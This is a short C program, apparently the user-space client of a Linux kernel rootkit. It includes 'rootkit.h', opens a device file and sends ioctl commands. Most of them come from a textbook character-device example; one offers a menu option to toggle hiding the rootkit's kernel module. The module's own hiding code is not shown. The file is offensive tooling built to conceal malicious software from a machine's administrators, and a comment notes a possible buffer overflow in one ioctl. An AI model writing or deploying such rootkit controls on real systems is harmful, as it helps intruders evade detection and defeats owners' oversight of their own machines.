#include "rootkit.h"

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>		/* open */
#include <unistd.h>		/* exit */
#include <sys/ioctl.h>		/* ioctl */

/* 
 * Functions for the ioctl calls 
 */

ioctl_set_msg(int file_desc, char *message)
{
  int ret_val;

  ret_val = ioctl(file_desc, IOCTL_SET_MSG, message);

  if (ret_val < 0) {
    printf("ioctl_set_msg failed:%d\n", ret_val);
    exit(-1);
  }
}

ioctl_get_msg(int file_desc)
{
  int ret_val;
  char message[100];

  /* 
   * Warning - this is dangerous because we don't tell
   * the kernel how far it's allowed to write, so it
   * might overflow the buffer. In a real production
   * program, we would have used two ioctls - one to tell
   * the kernel the buffer length and another to give
   * it the buffer to fill
   */
  ret_val = ioctl(file_desc, IOCTL_GET_MSG, message);

  if (ret_val < 0) {
    printf("ioctl_get_msg failed:%d\n", ret_val);
    exit(-1);
  }

  printf("get_msg message:%s\n", message);
}

ioctl_get_nth_byte(int file_desc)
{
  int i;
  char c;

  printf("get_nth_byte message:");

  i = 0;
  do {
    c = ioctl(file_desc, IOCTL_GET_NTH_BYTE, i++);

    if (c < 0) {
      printf
	("ioctl_get_nth_byte failed at the %d'th byte:\n",
	 i);
      exit(-1);
    }

    putchar(c);
  } while (c != 0);
  putchar('\n');
}
ioctl_toggle_hide_module(int file_desc){
  int ret_val;
  //char[100] message;
  ret_val = ioctl(file_desc, IOCTL_TOGGLE_HIDE_MODULE, 0);
}
/* 
 * Main - Call the ioctl functions 
 */
main()
{
  int file_desc, ret_val;
  char *msg = "Message passed by ioctl\n";
  char path[80];
  sprintf(path,"/dev/%s",DEVICE_FILE_NAME);
  file_desc = open(path, 0);
  if (file_desc < 0) {
    printf("Can't open device file: %s\n", path);
    exit(-1);
  }
  printf("Opened device file.\n");
  //ioctl_get_nth_byte(file_desc);
  // ioctl_get_msg(file_desc);
  //ioctl_set_msg(file_desc, msg);
  int input ;
  while (1){
    printf("1. hide module\n");

    printf("input:");
    scanf("%d", &input);
    switch(input){
    case 1:
      ioctl_toggle_hide_module(file_desc);
      return 0;
      //break;
      
    default:
      break;
    }
    
  }
  close(file_desc);
}
